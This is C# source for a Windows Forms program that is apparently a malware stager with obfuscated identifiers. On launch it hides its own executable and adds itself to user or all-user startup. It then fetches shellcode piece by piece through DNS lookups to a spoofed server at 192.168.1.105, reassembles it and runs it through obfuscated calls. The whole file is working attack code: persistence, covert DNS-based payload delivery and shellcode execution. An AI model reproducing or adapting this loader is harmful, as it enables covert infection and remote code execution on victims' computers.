﻿using System;
using System.Collections;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace RArAtiTdkA
{
    public partial class Form1 : Form
    {
        private static ArrayList shelcode = new ArrayList();

        public static string AES_KEY = "my_key";

        public static string DNS_PREFIX = "10.0.";

        public static string DNS_SPOOF_ADDRESS = "192.168.1.105";

        public Form1()
        {
            {
                String hiddenpath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                FileInfo f = new FileInfo(hiddenpath);
                f.Attributes = FileAttributes.Hidden;
                if (StartUpManager.IsUserAdministrator())
                {
                    String b = StartUpManager.checkExistanceFromAllUserStartup();
                    if (b == null)
                    {
                        StartUpManager.AddApplicationToAllUserStartup(hiddenpath);
                    }
                }
                else
                {
                    String b = StartUpManager.checkExistanceFromCurrentUserStartup();
                    if (b == null)
                    {
                        StartUpManager.AddApplicationToCurrentUserStartup(hiddenpath);
                    }
                }

                int counter = 0;
                int prefix = 0;
                while (true)
                {
                    String raw = DnsLookup.getNSLookup(Form1.DNS_PREFIX + prefix + "." + counter,
                        Form1.DNS_SPOOF_ADDRESS);
                    if (raw == null)
                        break;
                    shelcode.Add(raw);
                    Console.WriteLine("NS lookup " + counter + " for " + Form1.DNS_PREFIX + prefix + "." + counter +
                                      " on Dns spoof IP " + Form1.DNS_SPOOF_ADDRESS);
                    if (counter == 254)
                    {
                        counter = 0;
                        prefix = 1;
                    }
                    else
                    {
                        counter++;
                    }
                }

                //
                var BZCOUnCD = Util.ParseRawShellcode(shelcode);
                Random rnd = new Random();
                byte[] optionalEntropy = new byte[64];
                rnd.NextBytes(optionalEntropy);
                byte[] encryptedData =
                    ProtectedData.Protect(BZCOUnCD, optionalEntropy, DataProtectionScope.CurrentUser);

                dGVzdAo.rOMcboO.OQLRioRzeo(ProtectedData.Unprotect(encryptedData, optionalEntropy,
                    DataProtectionScope.CurrentUser));
            }
        }
    }
}    
